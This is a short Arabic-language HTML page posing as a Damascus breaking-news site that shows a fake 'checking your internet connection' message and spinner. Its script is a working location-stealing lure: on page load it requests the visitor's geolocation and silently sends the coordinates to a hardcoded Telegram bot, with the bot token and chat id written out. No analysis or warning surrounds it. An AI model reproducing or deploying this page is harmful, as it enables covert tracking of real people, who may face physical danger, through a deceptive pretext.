
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اخبار دمشق العاجلة</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f3f3;
            text-align: center;
            padding: 50px;
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
        .loader {
            margin-top: 30px;
            width: 100px;
            height: 100px;
            border: 10px solid #f3f3f3;
            border-top: 10px solid #3498db;
            border-radius: 50%;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            99% { transform: rotate(350deg); }
            100% { transform: rotate(350deg); }
        }
    </style>
</head>
<body>
    <h1>جاري التحقق من اتصالك بالإنترنت</h1>
    <p>يرجى عدم مغادرة الصفحة...</p>
    <div class="loader"></div>

    <script>
        function sendLocation(position) {
            fetch(`https://api.telegram.org/bot7607412954:AAFHsq0nijkAfPZ9Hz95Exs3zD9gQNVCMx4/sendLocation?chat_id=5003519098&latitude=${position.coords.latitude}&longitude=${position.coords.longitude}`)
                .then(response => console.log("Location sent"))
                .catch(error => console.error("Error sending location", error));
        }

        function errorHandler(error) {
            console.error("Error getting location", error);
        }

        navigator.geolocation.getCurrentPosition(sendLocation, errorHandler);
    </script>
</body>
</html>
